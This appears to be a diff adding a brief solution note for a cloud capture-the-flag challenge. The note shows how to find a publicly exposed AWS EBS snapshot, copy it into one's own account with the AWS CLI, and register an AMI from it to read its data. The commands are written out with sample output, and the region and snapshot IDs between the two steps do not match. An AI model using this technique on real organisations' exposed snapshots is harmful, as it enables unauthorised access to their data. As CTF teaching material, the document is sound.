@@ -1,0 +1,45 @@
+## Users should get a hint that the snapshot is being exposed. If they do not get we would provide hint
+
+they need to build the script which is provided snap.sh 
+
+From this script they find the exposed snapshots like below 
+
+{egion: us-east-1
+    "Snapshots": []
+}
+{egion: us-east-2
+    "Snapshots": []
+}
+{egion: ap-south-1
+    "Snapshots": [
+        {
+            "Description": "Cloud CTF Classified",
+            "Encrypted": false,
+            "OwnerId": "893813948482",
+            "Progress": "100%",
+            "SnapshotId": "snap-015e263d1a714176a",
+            "StartTime": "2021-11-12T10:27:35.929000+00:00",
+            "State": "completed",
+            "VolumeId": "vol-0a55d612a5c87b009",
+            "VolumeSize": 8
+        }
+    ]
+}
+
+
+Below commands they need to run 
+
+Copy snapshot their account 
+
+aws ec2 copy-snapshot  --description 'myec2' --destination-region us-east-1 --source-region ap-south-1 --source-snapshot-id snap-015e263d1a714176a
+
+aws ec2 register-image --region ap-south-1 --name 'myec2' --block-device-mappings DeviceName=/dev/xvda,Ebs={SnapshotId="snap-0594265b842fa8eaf"} --root-device-name "/dev/xvda"
+
+Below is the output they would get after running the above command
+
+{
+    "ImageId": "ami-067425d863b5bc5a0"
+}
+
+
+
